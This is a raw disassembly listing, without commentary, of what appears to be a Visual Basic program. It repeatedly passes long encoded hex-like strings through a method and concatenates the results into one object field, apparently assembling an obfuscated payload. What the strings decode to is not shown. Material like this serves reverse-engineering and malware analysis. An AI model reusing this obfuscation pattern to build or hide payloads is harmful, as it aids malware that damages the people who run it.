.text:0040908B                 push    eax
.text:0040908C                 push    2
.text:0040908E                 call    __vbaFreeStrList
.text:00409093                 add     esp, 0Ch
.text:00409096                 fld     ds:flt_4011E0
.text:0040909C                 fstp    dword ptr [ebp-20h]
.text:0040909F                 lea     eax, [ebp-18h]
.text:004090A2                 push    eax
.text:004090A3                 push    0
.text:004090A5                 lea     eax, [ebp-20h]
.text:004090A8                 push    eax
.text:004090A9                 push    offset aU495250515e4a4 ; "u495250515e4a4e5f5c4d4a515e5b4e514f4949"...
.text:004090AE                 mov     eax, [ebp+8]
.text:004090B1                 mov     eax, [eax]
.text:004090B3                 push    dword ptr [ebp+8]
.text:004090B6                 call    dword ptr [eax+24h]
.text:004090B9                 mov     [ebp-2Ch], eax
.text:004090BC                 cmp     dword ptr [ebp-2Ch], 0
.text:004090C0                 jge     short loc_4090DC
.text:004090C2                 push    24h ; '$'
.text:004090C4                 push    offset dword_4027CC
.text:004090C9                 push    dword ptr [ebp+8]
.text:004090CC                 push    dword ptr [ebp-2Ch]
.text:004090CF                 call    __vbaHresultCheckObj
.text:004090D4                 mov     [ebp-90h], eax
.text:004090DA                 jmp     short loc_4090E3
.text:004090DC ; ---------------------------------------------------------------------------
.text:004090DC
.text:004090DC loc_4090DC:                             ; CODE XREF: .text:004090C0↑j
.text:004090DC                 and     dword ptr [ebp-90h], 0
.text:004090E3
.text:004090E3 loc_4090E3:                             ; CODE XREF: .text:004090DA↑j
.text:004090E3                 mov     eax, [ebp+8]
.text:004090E6                 push    dword ptr [eax+7Ch]
.text:004090E9                 push    dword ptr [ebp-18h]
.text:004090EC                 call    __vbaStrCat
.text:004090F1                 mov     edx, eax
.text:004090F3                 lea     ecx, [ebp-1Ch]
.text:004090F6                 call    __vbaStrMove
.text:004090FB                 mov     edx, eax
.text:004090FD                 mov     ecx, [ebp+8]
.text:00409100                 add     ecx, 7Ch ; '|'
.text:00409103                 call    __vbaStrCopy
.text:00409108                 lea     eax, [ebp-1Ch]
.text:0040910B                 push    eax
.text:0040910C                 lea     eax, [ebp-18h]
.text:0040910F                 push    eax
.text:00409110                 push    2
.text:00409112                 call    __vbaFreeStrList
.text:00409117                 add     esp, 0Ch
.text:0040911A                 fld     ds:flt_4011DC
.text:00409120                 fstp    dword ptr [ebp-20h]
.text:00409123                 lea     eax, [ebp-18h]
.text:00409126                 push    eax
.text:00409127                 push    0
.text:00409129                 lea     eax, [ebp-20h]
.text:0040912C                 push    eax
.text:0040912D                 push    offset aL939097a4a1949 ; "l939097a4a19497958f8f8f8f928f929197a491"...
.text:00409132                 mov     eax, [ebp+8]
.text:00409135                 mov     eax, [eax]
.text:00409137                 push    dword ptr [ebp+8]
.text:0040913A                 call    dword ptr [eax+24h]
.text:0040913D                 mov     [ebp-2Ch], eax
.text:00409140                 cmp     dword ptr [ebp-2Ch], 0
.text:00409144                 jge     short loc_409160
.text:00409146                 push    24h ; '$'
.text:00409148                 push    offset dword_4027CC
.text:0040914D                 push    dword ptr [ebp+8]
.text:00409150                 push    dword ptr [ebp-2Ch]
.text:00409153                 call    __vbaHresultCheckObj
.text:00409158                 mov     [ebp-94h], eax
.text:0040915E                 jmp     short loc_409167
.text:00409160 ; ---------------------------------------------------------------------------
.text:00409160
.text:00409160 loc_409160:                             ; CODE XREF: .text:00409144↑j
.text:00409160                 and     dword ptr [ebp-94h], 0
.text:00409167
.text:00409167 loc_409167:                             ; CODE XREF: .text:0040915E↑j
.text:00409167                 mov     eax, [ebp+8]
.text:0040916A                 push    dword ptr [eax+7Ch]
.text:0040916D                 push    dword ptr [ebp-18h]
.text:00409170                 call    __vbaStrCat
.text:00409175                 mov     edx, eax
.text:00409177                 lea     ecx, [ebp-1Ch]
.text:0040917A                 call    __vbaStrMove
.text:0040917F                 mov     edx, eax
.text:00409181                 mov     ecx, [ebp+8]
.text:00409184                 add     ecx, 7Ch ; '|'
.text:00409187                 call    __vbaStrCopy
.text:0040918C                 lea     eax, [ebp-1Ch]
.text:0040918F                 push    eax
.text:00409190                 lea     eax, [ebp-18h]
.text:00409193                 push    eax
.text:00409194                 push    2
.text:00409196                 call    __vbaFreeStrList
.text:0040919B                 add     esp, 0Ch
.text:0040919E                 fld     ds:flt_4011D8
.text:004091A4                 fstp    dword ptr [ebp-20h]
.text:004091A7                 lea     eax, [ebp-18h]
.text:004091AA                 push    eax
.text:004091AB                 push    0
.text:004091AD                 lea     eax, [ebp-20h]
.text:004091B0                 push    eax
.text:004091B1                 push    offset aX89899a8f899d9 ; "X89899a8f899d9f9f8a8e908e89898989898991"...
.text:004091B6                 mov     eax, [ebp+8]
.text:004091B9                 mov     eax, [eax]
.text:004091BB                 push    dword ptr [ebp+8]
.text:004091BE                 call    dword ptr [eax+24h]
.text:004091C1                 mov     [ebp-2Ch], eax
.text:004091C4                 cmp     dword ptr [ebp-2Ch], 0
.text:004091C8                 jge     short loc_4091E4
.text:004091CA                 push    24h ; '$'
.text:004091CC                 push    offset dword_4027CC
.text:004091D1                 push    dword ptr [ebp+8]
.text:004091D4                 push    dword ptr [ebp-2Ch]
.text:004091D7                 call    __vbaHresultCheckObj
.text:004091DC                 mov     [ebp-98h], eax
.text:004091E2                 jmp     short loc_4091EB
.text:004091E4 ; ---------------------------------------------------------------------------
.text:004091E4
.text:004091E4 loc_4091E4:                             ; CODE XREF: .text:004091C8↑j
.text:004091E4                 and     dword ptr [ebp-98h], 0
.text:004091EB
.text:004091EB loc_4091EB:                             ; CODE XREF: .text:004091E2↑j
.text:004091EB                 mov     eax, [ebp+8]
.text:004091EE                 push    dword ptr [eax+7Ch]
.text:004091F1                 push    dword ptr [ebp-18h]
.text:004091F4                 call    __vbaStrCat
.text:004091F9                 mov     edx, eax
.text:004091FB                 lea     ecx, [ebp-1Ch]
.text:004091FE                 call    __vbaStrMove
.text:00409203                 mov     edx, eax
.text:00409205                 mov     ecx, [ebp+8]
.text:00409208                 add     ecx, 7Ch ; '|'
.text:0040920B                 call    __vbaStrCopy
.text:00409210                 lea     eax, [ebp-1Ch]
.text:00409213                 push    eax
.text:00409214                 lea     eax, [ebp-18h]
.text:00409217                 push    eax
.text:00409218                 push    2
.text:0040921A                 call    __vbaFreeStrList
.text:0040921F                 add     esp, 0Ch
.text:00409222                 fld     ds:flt_4011E0
.text:00409228                 fstp    dword ptr [ebp-20h]
.text:0040922B                 lea     eax, [ebp-18h]
.text:0040922E                 push    eax
.text:0040922F                 push    0
.text:00409231                 lea     eax, [ebp-20h]
.text:00409234                 push    eax
.text:00409235                 push    offset aM5a4f4d495a4f4 ; "m5a4f4d495a4f49495a4f49495a4f4b4e504e49"...
.text:0040923A                 mov     eax, [ebp+8]
.text:0040923D                 mov     eax, [eax]
.text:0040923F                 push    dword ptr [ebp+8]
.text:00409242                 call    dword ptr [eax+24h]
.text:00409245                 mov     [ebp-2Ch], eax
.text:00409248                 cmp     dword ptr [ebp-2Ch], 0
.text:0040924C                 jge     short loc_409268
.text:0040924E                 push    24h ; '$'
.text:00409250                 push    offset dword_4027CC
.text:00409255                 push    dword ptr [ebp+8]
.text:00409258                 push    dword ptr [ebp-2Ch]
.text:0040925B                 call    __vbaHresultCheckObj
.text:00409260                 mov     [ebp-9Ch], eax
.text:00409266                 jmp     short loc_40926F
.text:00409268 ; ---------------------------------------------------------------------------
.text:00409268
.text:00409268 loc_409268:                             ; CODE XREF: .text:0040924C↑j
.text:00409268                 and     dword ptr [ebp-9Ch], 0
.text:0040926F
.text:0040926F loc_40926F:                             ; CODE XREF: .text:00409266↑j
.text:0040926F                 mov     eax, [ebp+8]
.text:00409272                 push    dword ptr [eax+7Ch]
.text:00409275                 push    dword ptr [ebp-18h]
.text:00409278                 call    __vbaStrCat
.text:0040927D                 mov     edx, eax
.text:0040927F                 lea     ecx, [ebp-1Ch]
.text:00409282                 call    __vbaStrMove
.text:00409287                 mov     edx, eax
.text:00409289                 mov     ecx, [ebp+8]
.text:0040928C                 add     ecx, 7Ch ; '|'
.text:0040928F                 call    __vbaStrCopy
.text:00409294                 lea     eax, [ebp-1Ch]
.text:00409297                 push    eax
.text:00409298                 lea     eax, [ebp-18h]
.text:0040929B                 push    eax
.text:0040929C                 push    2
.text:0040929E                 call    __vbaFreeStrList
.text:004092A3                 add     esp, 0Ch
.text:004092A6                 fld     ds:flt_4011D4
.text:004092AC                 fstp    dword ptr [ebp-20h]
.text:004092AF                 lea     eax, [ebp-18h]
.text:004092B2                 push    eax
.text:004092B3                 push    0
.text:004092B5                 lea     eax, [ebp-20h]
.text:004092B8                 push    eax
.text:004092B9                 push    offset aR8988878c9b9b8 ; "r8988878c9b9b8e85978d8585858587859a8d8d"...
.text:004092BE                 mov     eax, [ebp+8]
.text:004092C1                 mov     eax, [eax]
.text:004092C3                 push    dword ptr [ebp+8]
.text:004092C6                 call    dword ptr [eax+24h]
.text:004092C9                 mov     [ebp-2Ch], eax
.text:004092CC                 cmp     dword ptr [ebp-2Ch], 0
.text:004092D0                 jge     short loc_4092EC
.text:004092D2                 push    24h ; '$'
.text:004092D4                 push    offset dword_4027CC
.text:004092D9                 push    dword ptr [ebp+8]
.text:004092DC                 push    dword ptr [ebp-2Ch]
.text:004092DF                 call    __vbaHresultCheckObj
.text:004092E4                 mov     [ebp-0A0h], eax
.text:004092EA                 jmp     short loc_4092F3
.text:004092EC ; ---------------------------------------------------------------------------
.text:004092EC
.text:004092EC loc_4092EC:                             ; CODE XREF: .text:004092D0↑j
.text:004092EC                 and     dword ptr [ebp-0A0h], 0
.text:004092F3
.text:004092F3 loc_4092F3:                             ; CODE XREF: .text:004092EA↑j
.text:004092F3                 mov     eax, [ebp+8]
.text:004092F6                 push    dword ptr [eax+7Ch]
.text:004092F9                 push    dword ptr [ebp-18h]
.text:004092FC                 call    __vbaStrCat
.text:00409301                 mov     edx, eax
.text:00409303                 lea     ecx, [ebp-1Ch]
.text:00409306                 call    __vbaStrMove
.text:0040930B                 mov     edx, eax
.text:0040930D                 mov     ecx, [ebp+8]
.text:00409310                 add     ecx, 7Ch ; '|'
.text:00409313                 call    __vbaStrCopy
.text:00409318                 lea     eax, [ebp-1Ch]
.text:0040931B                 push    eax
.text:0040931C                 lea     eax, [ebp-18h]
.text:0040931F                 push    eax
.text:00409320                 push    2
.text:00409322                 call    __vbaFreeStrList
.text:00409327                 add     esp, 0Ch
.text:0040932A                 fld     ds:flt_4011D0
.text:00409330                 fstp    dword ptr [ebp-20h]
.text:00409333                 lea     eax, [ebp-18h]
.text:00409336                 push    eax
.text:00409337                 push    0
.text:00409339                 lea     eax, [ebp-20h]
.text:0040933C                 push    eax
.text:0040933D                 push    offset aO9c9c868686868 ; "O9c9c86868686868986868e8c868a978c8f8698"...
.text:00409342                 mov     eax, [ebp+8]
.text:00409345                 mov     eax, [eax]
.text:00409347                 push    dword ptr [ebp+8]
.text:0040934A                 call    dword ptr [eax+24h]
.text:0040934D                 mov     [ebp-2Ch], eax
.text:00409350                 cmp     dword ptr [ebp-2Ch], 0
.text:00409354                 jge     short loc_409370
.text:00409356                 push    24h ; '$'
.text:00409358                 push    offset dword_4027CC
.text:0040935D                 push    dword ptr [ebp+8]
.text:00409360                 push    dword ptr [ebp-2Ch]
.text:00409363                 call    __vbaHresultCheckObj
.text:00409368                 mov     [ebp-0A4h], eax
.text:0040936E                 jmp     short loc_409377
.text:00409370 ; ---------------------------------------------------------------------------
.text:00409370
.text:00409370 loc_409370:                             ; CODE XREF: .text:00409354↑j
.text:00409370                 and     dword ptr [ebp-0A4h], 0
.text:00409377
.text:00409377 loc_409377:                             ; CODE XREF: .text:0040936E↑j
.text:00409377                 mov     eax, [ebp+8]
.text:0040937A                 push    dword ptr [eax+7Ch]
.text:0040937D                 push    dword ptr [ebp-18h]
.text:00409380                 call    __vbaStrCat
.text:00409385                 mov     edx, eax
.text:00409387                 lea     ecx, [ebp-1Ch]
.text:0040938A                 call    __vbaStrMove
.text:0040938F                 mov     edx, eax
.text:00409391                 mov     ecx, [ebp+8]
.text:00409394                 add     ecx, 7Ch ; '|'
.text:00409397                 call    __vbaStrCopy
.text:0040939C                 lea     eax, [ebp-1Ch]
.text:0040939F                 push    eax
.text:004093A0                 lea     eax, [ebp-18h]
.text:004093A3                 push    eax
.text:004093A4                 push    2
.text:004093A6                 call    __vbaFreeStrList
.text:004093AB                 add     esp, 0Ch
.text:004093AE                 fld     ds:flt_401210
.text:004093B4                 fstp    dword ptr [ebp-20h]
.text:004093B7                 lea     eax, [ebp-18h]
.text:004093BA                 push    eax
.text:004093BB                 push    0
.text:004093BD                 lea     eax, [ebp-20h]
.text:004093C0                 push    eax
.text:004093C1                 push    offset aU5250535258656 ; "U52505352586565526156515062585050505052"...
.text:004093C6                 mov     eax, [ebp+8]
.text:004093C9                 mov     eax, [eax]
.text:004093CB                 push    dword ptr [ebp+8]
.text:004093CE                 call    dword ptr [eax+24h]
.text:004093D1                 mov     [ebp-2Ch], eax
.text:004093D4                 cmp     dword ptr [ebp-2Ch], 0
.text:004093D8                 jge     short loc_4093F4
.text:004093DA                 push    24h ; '$'
.text:004093DC                 push    offset dword_4027CC
.text:004093E1                 push    dword ptr [ebp+8]
.text:004093E4                 push    dword ptr [ebp-2Ch]
.text:004093E7                 call    __vbaHresultCheckObj
.text:004093EC                 mov     [ebp-0A8h], eax
.text:004093F2                 jmp     short loc_4093FB
.text:004093F4 ; ---------------------------------------------------------------------------
.text:004093F4
.text:004093F4 loc_4093F4:                             ; CODE XREF: .text:004093D8↑j
.text:004093F4                 and     dword ptr [ebp-0A8h], 0
.text:004093FB
.text:004093FB loc_4093FB:                             ; CODE XREF: .text:004093F2↑j
.text:004093FB                 mov     eax, [ebp+8]
.text:004093FE                 push    dword ptr [eax+7Ch]
.text:00409401                 push    dword ptr [ebp-18h]
.text:00409404                 call    __vbaStrCat
.text:00409409                 mov     edx, eax
.text:0040940B                 lea     ecx, [ebp-1Ch]
.text:0040940E                 call    __vbaStrMove
.text:00409413                 mov     edx, eax
.text:00409415                 mov     ecx, [ebp+8]
.text:00409418                 add     ecx, 7Ch ; '|'
.text:0040941B                 call    __vbaStrCopy
.text:00409420                 lea     eax, [ebp-1Ch]
.text:00409423                 push    eax
.text:00409424                 lea     eax, [ebp-18h]
.text:00409427                 push    eax
.text:00409428                 push    2
.text:0040942A                 call    __vbaFreeStrList
.text:0040942F                 add     esp, 0Ch
.text:00409432                 fld     ds:flt_4011CC
.text:00409438                 fstp    dword ptr [ebp-20h]
.text:0040943B                 lea     eax, [ebp-18h]
.text:0040943E                 push    eax
.text:0040943F                 push    0
.text:00409441                 lea     eax, [ebp-20h]
.text:00409444                 push    eax
.text:00409445                 push    offset a7a7e8f8c7d7a81 ; "}7a7e8f8c7d7a818e8b7e817f797979797a7982"...
.text:0040944A                 mov     eax, [ebp+8]
.text:0040944D                 mov     eax, [eax]
.text:0040944F                 push    dword ptr [ebp+8]
.text:00409452                 call    dword ptr [eax+24h]
.text:00409455                 mov     [ebp-2Ch], eax
.text:00409458                 cmp     dword ptr [ebp-2Ch], 0
.text:0040945C                 jge     short loc_409478
.text:0040945E                 push    24h ; '$'
.text:00409460                 push    offset dword_4027CC
.text:00409465                 push    dword ptr [ebp+8]
.text:00409468                 push    dword ptr [ebp-2Ch]
.text:0040946B                 call    __vbaHresultCheckObj
.text:00409470                 mov     [ebp-0ACh], eax
.text:00409476                 jmp     short loc_40947F
.text:00409478 ; ---------------------------------------------------------------------------
.text:00409478
.text:00409478 loc_409478:                             ; CODE XREF: .text:0040945C↑j
.text:00409478                 and     dword ptr [ebp-0ACh], 0
.text:0040947F
.text:0040947F loc_40947F:                             ; CODE XREF: .text:00409476↑j
.text:0040947F                 mov     eax, [ebp+8]
.text:00409482                 push    dword ptr [eax+7Ch]
.text:00409485                 push    dword ptr [ebp-18h]
.text:00409488                 call    __vbaStrCat
.text:0040948D                 mov     edx, eax
.text:0040948F                 lea     ecx, [ebp-1Ch]
.text:00409492                 call    __vbaStrMove
.text:00409497                 mov     edx, eax
.text:00409499                 mov     ecx, [ebp+8]
.text:0040949C                 add     ecx, 7Ch ; '|'
.text:0040949F                 call    __vbaStrCopy
.text:004094A4                 lea     eax, [ebp-1Ch]
.text:004094A7                 push    eax
.text:004094A8                 lea     eax, [ebp-18h]
.text:004094AB                 push    eax
.text:004094AC                 push    2
.text:004094AE                 call    __vbaFreeStrList
.text:004094B3                 add     esp, 0Ch
.text:004094B6                 fld     ds:flt_4011C8
.text:004094BC                 fstp    dword ptr [ebp-20h]
.text:004094BF                 lea     eax, [ebp-18h]
.text:004094C2                 push    eax
.text:004094C3                 push    0
.text:004094C5                 lea     eax, [ebp-20h]
.text:004094C8                 push    eax
.text:004094C9                 push    offset a918e9c918b8b8b ; "~918e9c918b8b8b8b8b8b938d939d8b8b8b8b8b"...
.text:004094CE                 mov     eax, [ebp+8]
.text:004094D1                 mov     eax, [eax]
.text:004094D3                 push    dword ptr [ebp+8]
.text:004094D6                 call    dword ptr [eax+24h]
.text:004094D9                 mov     [ebp-2Ch], eax
.text:004094DC                 cmp     dword ptr [ebp-2Ch], 0
.text:004094E0                 jge     short loc_4094FC
.text:004094E2                 push    24h ; '$'
.text:004094E4                 push    offset dword_4027CC
.text:004094E9                 push    dword ptr [ebp+8]
.text:004094EC                 push    dword ptr [ebp-2Ch]
.text:004094EF                 call    __vbaHresultCheckObj
.text:004094F4                 mov     [ebp-0B0h], eax
.text:004094FA                 jmp     short loc_409503
.text:004094FC ; ---------------------------------------------------------------------------
.text:004094FC
.text:004094FC loc_4094FC:                             ; CODE XREF: .text:004094E0↑j
.text:004094FC                 and     dword ptr [ebp-0B0h], 0
.text:00409503
.text:00409503 loc_409503:                             ; CODE XREF: .text:004094FA↑j
.text:00409503                 mov     eax, [ebp+8]
.text:00409506                 push    dword ptr [eax+7Ch]
.text:00409509                 push    dword ptr [ebp-18h]
.text:0040950C                 call    __vbaStrCat
.text:00409511                 mov     edx, eax
.text:00409513                 lea     ecx, [ebp-1Ch]
.text:00409516                 call    __vbaStrMove
.text:0040951B                 mov     edx, eax
.text:0040951D                 mov     ecx, [ebp+8]
.text:00409520                 add     ecx, 7Ch ; '|'
.text:00409523                 call    __vbaStrCopy
.text:00409528                 lea     eax, [ebp-1Ch]
.text:0040952B                 push    eax
.text:0040952C                 lea     eax, [ebp-18h]
.text:0040952F                 push    eax
.text:00409530                 push    2
.text:00409532                 call    __vbaFreeStrList
.text:00409537                 add     esp, 0Ch
.text:0040953A                 fld     ds:flt_4011C4
.text:00409540                 fstp    dword ptr [ebp-20h]
.text:00409543                 lea     eax, [ebp-18h]
.text:00409546                 push    eax
.text:00409547                 push    0
.text:00409549                 lea     eax, [ebp-20h]
.text:0040954C                 push    eax
.text:0040954D                 push    offset aQ9493a3989395a ; "q9493a3989395a8a894979a94a3989292929293"...
.text:00409552                 mov     eax, [ebp+8]
.text:00409555                 mov     eax, [eax]
.text:00409557                 push    dword ptr [ebp+8]
.text:0040955A                 call    dword ptr [eax+24h]
.text:0040955D                 mov     [ebp-2Ch], eax
.text:00409560                 cmp     dword ptr [ebp-2Ch], 0
.text:00409564                 jge     short loc_409580
.text:00409566                 push    24h ; '$'
.text:00409568                 push    offset dword_4027CC
.text:0040956D                 push    dword ptr [ebp+8]
.text:00409570                 push    dword ptr [ebp-2Ch]
.text:00409573                 call    __vbaHresultCheckObj
.text:00409578                 mov     [ebp-0B4h], eax
.text:0040957E                 jmp     short loc_409587
.text:00409580 ; ---------------------------------------------------------------------------
.text:00409580
.text:00409580 loc_409580:                             ; CODE XREF: .text:00409564↑j
.text:00409580                 and     dword ptr [ebp-0B4h], 0
.text:00409587
.text:00409587 loc_409587:                             ; CODE XREF: .text:0040957E↑j
.text:00409587                 mov     eax, [ebp+8]
.text:0040958A                 push    dword ptr [eax+7Ch]
.text:0040958D                 push    dword ptr [ebp-18h]
.text:00409590                 call    __vbaStrCat
.text:00409595                 mov     edx, eax
.text:00409597                 lea     ecx, [ebp-1Ch]
.text:0040959A                 call    __vbaStrMove
.text:0040959F                 mov     edx, eax
.text:004095A1                 mov     ecx, [ebp+8]
.text:004095A4                 add     ecx, 7Ch ; '|'
.text:004095A7                 call    __vbaStrCopy
.text:004095AC                 lea     eax, [ebp-1Ch]
.text:004095AF                 push    eax
.text:004095B0                 lea     eax, [ebp-18h]
.text:004095B3                 push    eax
.text:004095B4                 push    2
.text:004095B6                 call    __vbaFreeStrList
.text:004095BB                 add     esp, 0Ch
.text:004095BE                 fld     ds:flt_4011C0
.text:004095C4                 fstp    dword ptr [ebp-20h]
.text:004095C7                 lea     eax, [ebp-18h]
.text:004095CA                 push    eax
.text:004095CB                 push    0
.text:004095CD                 lea     eax, [ebp-20h]
.text:004095D0                 push    eax
.text:004095D1                 push    offset aK686869687b6d7 ; "k686869687b6d707d6e6a796e696b6b68686868"...
.text:004095D6                 mov     eax, [ebp+8]
.text:004095D9                 mov     eax, [eax]
.text:004095DB                 push    dword ptr [ebp+8]
.text:004095DE                 call    dword ptr [eax+24h]
.text:004095E1                 mov     [ebp-2Ch], eax
.text:004095E4                 cmp     dword ptr [ebp-2Ch], 0
.text:004095E8                 jge     short loc_409604
.text:004095EA                 push    24h ; '$'
.text:004095EC                 push    offset dword_4027CC
.text:004095F1                 push    dword ptr [ebp+8]
.text:004095F4                 push    dword ptr [ebp-2Ch]
.text:004095F7                 call    __vbaHresultCheckObj
.text:004095FC                 mov     [ebp-0B8h], eax
.text:00409602                 jmp     short loc_40960B
.text:00409604 ; ---------------------------------------------------------------------------
.text:00409604
.text:00409604 loc_409604:                             ; CODE XREF: .text:004095E8↑j
.text:00409604                 and     dword ptr [ebp-0B8h], 0
.text:0040960B
.text:0040960B loc_40960B:                             ; CODE XREF: .text:00409602↑j
.text:0040960B                 mov     eax, [ebp+8]
.text:0040960E                 push    dword ptr [eax+7Ch]
.text:00409611                 push    dword ptr [ebp-18h]
.text:00409614                 call    __vbaStrCat
.text:00409619                 mov     edx, eax
.text:0040961B                 lea     ecx, [ebp-1Ch]
.text:0040961E                 call    __vbaStrMove
.text:00409623                 mov     edx, eax
.text:00409625                 mov     ecx, [ebp+8]
.text:00409628                 add     ecx, 7Ch ; '|'
.text:0040962B                 call    __vbaStrCopy
.text:00409630                 lea     eax, [ebp-1Ch]
.text:00409633                 push    eax
.text:00409634                 lea     eax, [ebp-18h]
.text:00409637                 push    eax
.text:00409638                 push    2
.text:0040963A                 call    __vbaFreeStrList
.text:0040963F                 add     esp, 0Ch
.text:00409642                 fld     ds:flt_4011BC
.text:00409648                 fstp    dword ptr [ebp-20h]
.text:0040964B                 lea     eax, [ebp-18h]
.text:0040964E                 push    eax
.text:0040964F                 push    0
.text:00409651                 lea     eax, [ebp-20h]
.text:00409654                 push    eax
.text:00409655                 push    offset aU4c4c4d4c5d4e5 ; "u4c4c4d4c5d4e54614c4c5d524d4f62624e5152"...
.text:0040965A                 mov     eax, [ebp+8]
.text:0040965D                 mov     eax, [eax]
.text:0040965F                 push    dword ptr [ebp+8]
.text:00409662                 call    dword ptr [eax+24h]
.text:00409665                 mov     [ebp-2Ch], eax
.text:00409668                 cmp     dword ptr [ebp-2Ch], 0
.text:0040966C                 jge     short loc_409688
.text:0040966E                 push    24h ; '$'
.text:00409670                 push    offset dword_4027CC
.text:00409675                 push    dword ptr [ebp+8]
.text:00409678                 push    dword ptr [ebp-2Ch]
.text:0040967B                 call    __vbaHresultCheckObj
.text:00409680                 mov     [ebp-0BCh], eax
.text:00409686                 jmp     short loc_40968F
.text:00409688 ; ---------------------------------------------------------------------------
.text:00409688
.text:00409688 loc_409688:                             ; CODE XREF: .text:0040966C↑j
.text:00409688                 and     dword ptr [ebp-0BCh], 0
.text:0040968F
.text:0040968F loc_40968F:                             ; CODE XREF: .text:00409686↑j
.text:0040968F                 mov     eax, [ebp+8]
.text:00409692                 push    dword ptr [eax+7Ch]
.text:00409695                 push    dword ptr [ebp-18h]
.text:00409698                 call    __vbaStrCat
.text:0040969D                 mov     edx, eax
.text:0040969F                 lea     ecx, [ebp-1Ch]
.text:004096A2                 call    __vbaStrMove
.text:004096A7                 mov     edx, eax
.text:004096A9                 mov     ecx, [ebp+8]
.text:004096AC                 add     ecx, 7Ch ; '|'
.text:004096AF                 call    __vbaStrCopy
.text:004096B4                 lea     eax, [ebp-1Ch]
.text:004096B7                 push    eax
.text:004096B8                 lea     eax, [ebp-18h]
.text:004096BB                 push    eax
.text:004096BC                 push    2
.text:004096BE                 call    __vbaFreeStrList
.text:004096C3                 add     esp, 0Ch
.text:004096C6                 fld     ds:flt_4011B8
.text:004096CC                 fstp    dword ptr [ebp-20h]
.text:004096CF                 lea     eax, [ebp-18h]
.text:004096D2                 push    eax
.text:004096D3                 push    0
.text:004096D5                 lea     eax, [ebp-20h]
.text:004096D8                 push    eax
.text:004096D9                 push    offset a65667469797979 ; ".656674697979797979796666686b7963747675"...
.text:004096DE                 mov     eax, [ebp+8]
.text:004096E1                 mov     eax, [eax]
.text:004096E3                 push    dword ptr [ebp+8]
.text:004096E6                 call    dword ptr [eax+24h]
.text:004096E9                 mov     [ebp-2Ch], eax
.text:004096EC                 cmp     dword ptr [ebp-2Ch], 0
.text:004096F0                 jge     short loc_40970C
.text:004096F2                 push    24h ; '$'
.text:004096F4                 push    offset dword_4027CC
.text:004096F9                 push    dword ptr [ebp+8]
.text:004096FC                 push    dword ptr [ebp-2Ch]
.text:004096FF                 call    __vbaHresultCheckObj
.text:00409704                 mov     [ebp-0C0h], eax
.text:0040970A                 jmp     short loc_409713
.text:0040970C ; ---------------------------------------------------------------------------
.text:0040970C
.text:0040970C loc_40970C:                             ; CODE XREF: .text:004096F0↑j
.text:0040970C                 and     dword ptr [ebp-0C0h], 0
.text:00409713
.text:00409713 loc_409713:                             ; CODE XREF: .text:0040970A↑j
.text:00409713                 mov     eax, [ebp+8]
.text:00409716                 push    dword ptr [eax+7Ch]
.text:00409719                 push    dword ptr [ebp-18h]
.text:0040971C                 call    __vbaStrCat
.text:00409721                 mov     edx, eax
.text:00409723                 lea     ecx, [ebp-1Ch]
.text:00409726                 call    __vbaStrMove
.text:0040972B                 mov     edx, eax
.text:0040972D                 mov     ecx, [ebp+8]
.text:00409730                 add     ecx, 7Ch ; '|'
.text:00409733                 call    __vbaStrCopy
.text:00409738                 lea     eax, [ebp-1Ch]
.text:0040973B                 push    eax
.text:0040973C                 lea     eax, [ebp-18h]
.text:0040973F                 push    eax
.text:00409740                 push    2
.text:00409742                 call    __vbaFreeStrList
.text:00409747                 add     esp, 0Ch
.text:0040974A                 fld     ds:flt_4011D8
.text:00409750                 fstp    dword ptr [ebp-20h]
.text:00409753                 lea     eax, [ebp-18h]
.text:00409756                 push    eax
.text:00409757                 push    0
.text:00409759                 lea     eax, [ebp-20h]
.text:0040975C                 push    eax
.text:0040975D                 push    offset a8b8e92899b9189 ; "/8b8e92899b918989898989899a9c919e9e8b9a"...
.text:00409762                 mov     eax, [ebp+8]
.text:00409765                 mov     eax, [eax]
.text:00409767                 push    dword ptr [ebp+8]
.text:0040976A                 call    dword ptr [eax+24h]
.text:0040976D                 mov     [ebp-2Ch], eax
.text:00409770                 cmp     dword ptr [ebp-2Ch], 0
.text:00409774                 jge     short loc_409790
.text:00409776                 push    24h ; '$'
.text:00409778                 push    offset dword_4027CC
.text:0040977D                 push    dword ptr [ebp+8]
.text:00409780                 push    dword ptr [ebp-2Ch]
.text:00409783                 call    __vbaHresultCheckObj
.text:00409788                 mov     [ebp-0C4h], eax
.text:0040978E                 jmp     short loc_409797
.text:00409790 ; ---------------------------------------------------------------------------
.text:00409790
.text:00409790 loc_409790:                             ; CODE XREF: .text:00409774↑j
.text:00409790                 and     dword ptr [ebp-0C4h], 0
.text:00409797
.text:00409797 loc_409797:                             ; CODE XREF: .text:0040978E↑j
.text:00409797                 mov     eax, [ebp+8]
.text:0040979A                 push    dword ptr [eax+7Ch]
.text:0040979D                 push    dword ptr [ebp-18h]
.text:004097A0                 call    __vbaStrCat
.text:004097A5                 mov     edx, eax
.text:004097A7                 lea     ecx, [ebp-1Ch]
.text:004097AA                 call    __vbaStrMove
.text:004097AF                 mov     edx, eax
.text:004097B1                 mov     ecx, [ebp+8]
.text:004097B4                 add     ecx, 7Ch ; '|'
.text:004097B7                 call    __vbaStrCopy
.text:004097BC                 lea     eax, [ebp-1Ch]
.text:004097BF                 push    eax
.text:004097C0                 lea     eax, [ebp-18h]
.text:004097C3                 push    eax
.text:004097C4                 push    2
.text:004097C6                 call    __vbaFreeStrList
.text:004097CB                 add     esp, 0Ch
.text:004097CE                 fld     ds:flt_4011FC
.text:004097D4                 fstp    dword ptr [ebp-20h]
.text:004097D7                 lea     eax, [ebp-18h]
.text:004097DA                 push    eax
.text:004097DB                 push    0
.text:004097DD                 lea     eax, [ebp-20h]
.text:004097E0                 push    eax
.text:004097E1                 push    offset aJ7f7f7f7f83888 ; "J7f7f7f7f8388879485839085808091877f7f7f"...
.text:004097E6                 mov     eax, [ebp+8]
.text:004097E9                 mov     eax, [eax]
.text:004097EB                 push    dword ptr [ebp+8]
.text:004097EE                 call    dword ptr [eax+24h]
.text:004097F1                 mov     [ebp-2Ch], eax
.text:004097F4                 cmp     dword ptr [ebp-2Ch], 0
.text:004097F8                 jge     short loc_409814
.text:004097FA                 push    24h ; '$'
.text:004097FC                 push    offset dword_4027CC
.text:00409801                 push    dword ptr [ebp+8]
.text:00409804                 push    dword ptr [ebp-2Ch]
.text:00409807                 call    __vbaHresultCheckObj
.text:0040980C                 mov     [ebp-0C8h], eax
.text:00409812                 jmp     short loc_40981B
.text:00409814 ; ---------------------------------------------------------------------------
.text:00409814
.text:00409814 loc_409814:                             ; CODE XREF: .text:004097F8↑j
